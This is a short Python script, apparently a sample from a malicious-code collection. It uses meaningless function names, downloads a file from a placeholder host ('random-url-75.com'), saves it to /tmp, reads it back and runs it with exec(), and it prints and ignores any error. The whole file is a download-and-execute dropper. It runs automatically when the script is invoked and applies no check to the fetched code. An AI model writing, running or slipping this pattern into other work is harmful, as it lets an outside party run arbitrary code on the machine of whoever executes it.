import requests
import os

def f1(url):
    resp = requests.get(url)
    return resp.text

def f2(fpath, code):
    with open(fpath, "w") as f:
        f.write(code)

def f3(fpath):
    with open(fpath, "r") as f:
        return f.read()

def f4(scr):
    try:
        exec(scr)
    except Exception as e:
        print(e)

def f5(url, fpath):
    c = f1(url)
    f2(fpath, c)

    scr = f3(fpath)
    f4(scr)

def main():
    rndm_url = "http://random-url-75.com/script.py"
    local_f = "/tmp/script75.py"

    f5(rndm_url, local_f)

main()
